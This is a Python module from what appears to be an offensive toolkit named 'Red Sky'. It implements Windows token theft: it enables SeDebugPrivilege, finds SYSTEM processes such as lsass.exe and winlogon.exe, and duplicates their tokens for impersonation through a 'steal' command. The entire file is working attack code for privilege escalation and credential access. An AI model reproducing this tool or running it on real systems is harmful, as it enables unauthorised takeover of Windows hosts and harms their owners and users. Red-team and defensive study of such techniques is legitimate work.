# language: Python, file: Program/creds/token.py, target: Red Sky creds — token manipulation
# Local Windows token operations. Runs on Windows only. Impersonate a process's
# token, duplicate it, run a command with it. Requires SeDebugPrivilege for
# cross-process token theft.

import ctypes
import json
import sys
from ctypes import wintypes
from typing import List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet


# Windows API constants
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_IMPERSONATE = 0x0004
TOKEN_ALL_ACCESS = 0xF01FF
MAXIMUM_ALLOWED = 0x02000000
SECURITY_IMPERSONATION = 2
SECURITY_DELEGATION = 3
SE_PRIVILEGE_ENABLED = 0x00000002
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000


def _is_windows() -> bool:
    return sys.platform.startswith("win")


def _advapi():
    return ctypes.WinDLL("advapi32", use_last_error=True)


def _kernel32():
    return ctypes.WinDLL("kernel32", use_last_error=True)


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD),
                ("Privileges", LUID_AND_ATTRIBUTES * 1)]


def _find_pid_by_name(name: str) -> Optional[int]:
    """Enumerate processes via CreateToolhelp32Snapshot."""
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", ctypes.c_char * 260),
        ]

    k32 = _kernel32()
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return None
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if not k32.Process32First(snap, ctypes.byref(pe)):
        k32.CloseHandle(snap)
        return None
    found = None
    while True:
        exe = pe.szExeFile.decode("ascii", errors="ignore")
        if exe.lower() == name.lower():
            found = pe.th32ProcessID
            break
        if not k32.Process32Next(snap, ctypes.byref(pe)):
            break
    k32.CloseHandle(snap)
    return found


def _enable_privilege(name: str) -> bool:
    """Enable SeDebugPrivilege etc. on our own token."""
    adv = _advapi()
    k32 = _kernel32()

    token = wintypes.HANDLE()
    if not adv.OpenProcessToken(k32.GetCurrentProcess(),
                                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                ctypes.byref(token)):
        return False
    luid = LUID()
    if not adv.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
        k32.CloseHandle(token)
        return False
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    ok = adv.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None)
    k32.CloseHandle(token)
    return bool(ok)


def _steal_token(pid: int) -> Optional[int]:
    """Open process, duplicate its token, return handle (as int)."""
    adv = _advapi()
    k32 = _kernel32()

    h_proc = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not h_proc:
        print_err(f"OpenProcess({pid}) failed: {ctypes.get_last_error()}")
        return None

    h_tok = wintypes.HANDLE()
    if not adv.OpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_QUERY,
                                ctypes.byref(h_tok)):
        print_err(f"OpenProcessToken failed: {ctypes.get_last_error()}")
        k32.CloseHandle(h_proc)
        return None

    h_dup = wintypes.HANDLE()
    if not adv.DuplicateTokenEx(h_tok, MAXIMUM_ALLOWED, None,
                                SECURITY_IMPERSONATION, 2,  # TokenImpersonation
                                ctypes.byref(h_dup)):
        print_err(f"DuplicateTokenEx failed: {ctypes.get_last_error()}")
        k32.CloseHandle(h_tok)
        k32.CloseHandle(h_proc)
        return None

    k32.CloseHandle(h_tok)
    k32.CloseHandle(h_proc)
    return h_dup.value


def cmd_list() -> int:
    if not _is_windows():
        print_err("token operations run on Windows only")
        return 1
    print_info("listing accessible processes with SYSTEM/SYSTEM-adjacent tokens")
    for name in ("lsass.exe", "winlogon.exe", "services.exe", "smss.exe", "csrss.exe"):
        pid = _find_pid_by_name(name)
        if pid:
            print(f"  {ARTERY}▓{RESET} {BONE}{name:<20}{RESET} pid={pid}")
    return 0


def cmd_steal(process_name: str) -> int:
    if not _is_windows():
        print_err("token operations run on Windows only")
        return 1

    if not _enable_privilege("SeDebugPrivilege"):
        print_warn("SeDebugPrivilege not available (need admin)")

    pid = _find_pid_by_name(process_name)
    if not pid:
        print_err(f"process not found: {process_name}")
        return 1

    print_info(f"stealing token from {process_name} (pid {pid})")
    handle = _steal_token(pid)
    if not handle:
        return 1

    print_ok(f"token handle acquired: 0x{handle:x}")
    print_info("to use this token, impacket-style shells or a native wrapper is needed")
    return 0


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky creds token <list|steal> [process]")
        return 2

    sub = args[0]
    if sub == "list":
        return cmd_list()
    if sub == "steal":
        if len(args) < 2:
            print_err("steal needs a process name, e.g. lsass.exe")
            return 2
        return cmd_steal(args[1])
    print_err(f"unknown token action: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
